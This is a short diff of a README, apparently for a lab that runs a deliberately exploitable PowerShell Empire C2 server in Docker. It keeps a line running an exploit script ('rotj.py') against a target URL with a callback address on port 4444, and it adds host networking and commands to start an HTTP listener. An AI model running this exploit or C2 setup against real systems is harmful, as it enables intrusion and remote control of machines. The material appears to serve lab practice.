@@ -15,9 +15,14 @@ python3 ./rotj.py 'http://192.168.158.171:80' 127.0.0.1 4444
 
 ```
 sudo docker build . exploitable/empire
-sudo docker run -it -p 1337:1337 -p 5000:5000 exploitable/empire
+sudo docker run --network=host exploitable/empire
 
 EMPIRE
 sudo docker exec -it 2ec72f1568dd ./ps-empire client
+# once the client is started you'll need to start a listener
 
+uselistner http
+execute
 ```
+
+
